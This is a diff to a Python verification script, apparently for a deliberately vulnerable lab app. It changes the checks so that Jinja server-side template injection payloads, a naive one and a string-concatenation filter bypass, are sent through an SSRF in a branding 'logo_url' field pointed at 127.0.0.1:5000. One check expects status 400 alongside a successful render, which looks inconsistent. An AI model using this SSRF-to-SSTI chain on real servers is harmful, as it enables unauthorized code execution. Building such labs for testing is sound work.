@@ -62,20 +62,36 @@ def main():
     )
 
     resp = session.get(f"{BASE_URL}/admin/report-template")
-    check("administrator can reach admin panel", resp.status_code == 200)
-
-    resp = session.post(
-        f"{BASE_URL}/admin/report-template", data={"template": "{{ ''.__class__ }}"}
+    check(
+        "report-template rejects a direct external request, even as administrator",
+        resp.status_code == 403,
     )
-    check("naive SSTI payload blocked", resp.status_code == 400)
 
+    # The web container reaches itself on its own gunicorn port (5000) --
+    # this is the loopback address as seen from *inside* that container's
+    # network namespace, which is what the branding SSRF actually fetches.
+    # It is not related to BASE_URL, which is the external nginx address.
     resp = session.post(
-        f"{BASE_URL}/admin/report-template",
-        data={"template": "{{''['_'~'_cla'~'ss_'~'_']}}"},
+        f"{BASE_URL}/admin/branding",
+        data={"logo_url": "http://127.0.0.1:5000/admin/report-template?template={{ ''.__class__ }}"},
     )
     check(
-        "verified SSTI bypass renders class object over HTTPS",
-        resp.status_code == 200 and "class 'str'" in resp.text,
+        "naive SSTI payload still blocked, reached only via the branding SSRF",
+        resp.status_code == 400 and "Blocked pattern detected" in resp.text,
+    )
+
+    resp = session.post(
+        f"{BASE_URL}/admin/branding",
+        data={
+            "logo_url": (
+                "http://127.0.0.1:5000/admin/report-template"
+                "?template={{''['_'~'_cla'~'ss_'~'_']}}"
+            )
+        },
+    )
+    check(
+        "verified SSTI bypass renders class object, reached only via the branding SSRF",
+        resp.status_code == 400 and "class 'str'" in resp.text,
     )
 
     # Spec S3's other half: 80 must redirect rather than serve. Only
